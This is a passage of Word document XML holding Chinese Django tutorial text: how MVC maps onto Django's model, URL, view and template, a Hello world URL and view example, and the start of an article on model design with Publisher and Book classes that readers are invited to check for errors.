    <w:p w14:paraId="4A36C9EC" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>MVC最大的优点是实现了软件或网络应用开发过程中数据，业务逻辑和界面的分离，使软件开发更清晰，也是维护变得更容易。这与静态网页设计中使用html和css实现了内容和样式的分离是同一个道理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32ED4365" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="533F394E" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django网站开发是如何遵循MVC设计模式的?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B864758" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django网站开发全靠四件套: Model(模型), URL(链接), View(视图) 和Template(模板)。它们看似与MVC设计模式不太一致，其实本质是相同的。但是Django的View和经典的View确实有非常大的不同。Django四件套与经典的MVC对应关系如下。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296BC4ED" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django Model(模型)</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>: 这个与经典MVC模式下的Model差不多。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266E764A" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django URL + View(视图)</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>: 这两个合起来与经典MVC下的Controller更像。原因在于Django的URL和View合起来才能向Template传递正确的数据。用户输入提供的数据也需要Django的View来处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76BCC594" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django Template(模板)</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>: 这个与经典MVC模式下的View一致。Django模板用来呈现Django view传来的数据，也决定了用户界面的外观。Template里面也包含了表单，可以用来搜集用户的输入。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F4B0A8" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4029FA78" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django网站开发应先写URL还是先写View?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="257A947A" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用Django开发网站的第一步绝对是定义模型(Model),  如果写个不需要使用数据库的小应用，也完全可以不定义模型，直接写URL和View, 比如下面打印Hello world的案例。那么问题来了，我们一般该先写URL还是View呢？答案是两者都可以，完全取决于个人偏好。一般来说喜欢从上至下思考的人都喜欢先写URL，小编我就是这样的人。那么你呢？欢迎留言啊。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70966356" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#helloworld/urls.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1320533C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78936AD9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9EDFB7" w14:textId="5A25D619" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from . import views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BF94FB0" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5672F578" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>urlpatterns = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="133FD10A" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    path('', views.index, name='index'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53EE0F16" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F370186" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#helloworld/views.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4504CE40" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33EAA546" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>from django.http import HttpResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12433B50" w14:textId="64693A33" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="502D0354" w14:textId="634DC539" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return HttpResponse("Hello world！")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB8D6DD" w14:textId="72DFB0A6" w:rsidR="001C47AF" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>003</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId232" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rStyle w:val="a9"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django基础核心技术介绍(1): Model模型的介绍与设计</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="463EEE8B" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django基础核心技术之Model模型的介绍与设计</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77521B31" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 Yunbo Shi </w:t>
      </w:r>
      <w:hyperlink r:id="rId233" w:history="1">
        <w:r w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-05-03</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23EA18B2" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>来自专辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66C21BBC" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django基础连载</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="341BEFE4" w14:textId="5402D0A3" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django网络应用开发的</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>5项基础核心技术</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>包括模型（Model）的设计，URL的配置，View（视图）的编写，Template（模板）的设计和Form(表单)的使用。今天小编我就拼了老命来用千字长文给你来介绍下第一项Django核心基础知识之Model的设计吧。想持续了解后续Django Web开发技术请订阅我的公众号【</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Python与Django大咖之路</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>】。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5128E1CD" w14:textId="500E69EF" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>什么是Model模型？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="286B49D8" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Model (模型) 简而言之即数据模型。模型不是数据本身（比如数据库里的数据），而是抽象的描述数据的构成和逻辑关系。每个Django model实际上是个类，继承了models.Model。每个Model应该包括属性，关系（比如单对单，单对多和多对多）和方法。当你定义好Model模型后，Django的接口会自动帮你在数据库生成相应的数据表(table)。这样你就不用自己用SQL语言创建表格或在数据库里操作创建表格了，是不是很省心？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36FCAB2D" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="163FB0AC" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们来看个书与出版社的实际案例。出版社有名字和地址。书有名字，描述和添加日期。当然我们还要利用ForeignKey定义出版社与书单对多的关系，因为一个出版社可以出版很多书。我们定义了如下模型，那你看看代码有问题吗?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2469695D" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># models.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFBD512"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django.db import models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2A0DE6" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A63FBDC" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Publisher(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C1EF74"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name = models.CharField(max_length=30)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230C0863"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address = models.CharField()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FAA903D" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D6C3891"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def __str__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC30CA8"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return self.name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C97E25" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F927AF" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Book(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61744109"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name = models.CharField(max_length=30)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43EFD5A7"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description = models.TextField(blank=True, null=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E44A46"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publisher = ForeignKey(Publisher)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B023AC4"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add_date = models.DateField()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F955B27" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FD6BB04"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 xml:space="preserve">    def __str__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BD145BE"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return self.name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="066D7A32" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
